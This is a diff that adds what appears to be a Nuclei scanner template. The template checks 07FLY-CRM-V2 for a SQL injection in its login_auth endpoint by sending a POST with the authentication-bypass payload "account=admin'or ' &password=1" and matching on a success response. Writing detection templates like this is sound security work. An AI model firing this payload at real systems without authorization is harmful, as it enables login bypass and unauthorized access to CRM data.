@@ -1,0 +1,25 @@
+id: 07fly-crm-v2-sqli
+info:
+  name: 07FLY-CRM-V2 login_auth SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php/sysmanage/Login/login_auth/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "account=admin'or ' &password=1"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"statusCode":"200","message":"'
+          - '"callbackType":"'
